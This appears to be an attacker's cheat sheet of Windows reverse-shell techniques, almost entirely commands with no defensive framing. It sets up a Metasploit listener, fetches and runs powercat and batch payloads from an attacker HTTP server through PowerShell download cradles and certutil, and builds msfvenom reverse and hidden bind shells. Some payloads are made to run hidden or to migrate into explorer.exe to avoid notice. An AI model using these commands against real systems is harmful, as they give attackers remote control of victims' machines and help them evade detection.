
common metasploit listener:
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT <PORT>; set ExitOnSession false; exploit -j"
```



using powercat:
```bash
attacker machine:

where powercat installed:
python3 -m http.server 9090

start netcat listener:
nc -nvlp 1234


target machine:
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.120:9090/powercat.ps1');powercat -c 192.168.1.120 -p 1234 -e cmd"
```


using batch file:
```bash
attacker machine:

msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
python3 -m http.server 9090

msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.104 lport=4444 –f exe > shell.exe


nc -nvlp 4444

target systm:
Invoke-WebRequest -Uri "http://192.168.1.120:9090/shell.bat" -OutFile "$env:TEMP\shell.bat"; Start-Process "$env:TEMP\shell.bat" -WindowStyle Hidden

```

using certutil.exe :
```bash
certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
```


Msiexec.exe:
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
```


Hidden bind shell:
```bash
msfvenom -p windows/shell_hidden_bind_tcp ahost=192.168.0.107 lport=1010 -f exe > /root/Desktop/hidden.exe
```



get tty windows shell:
```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/shell.ps1')"
```


having cmd shell upgrade tty shell:
```bash
powershell.exe -NoLogo -NoExit -Command "$Host.UI.RawUI.WindowTitle = 'Upgraded Shell';"
```

Hiding Shell with Prepend Migrate using Msfvenom:

```bash
#this shell migrate between processes.
msfvenom –p windows/meterpreter/reverse_tcp lhost=192.168.1.104 lport=5555 prependmigrate=true prepenmigrateprocess=explorer.exe –f exe > /root/Desktop/raj.exe

```



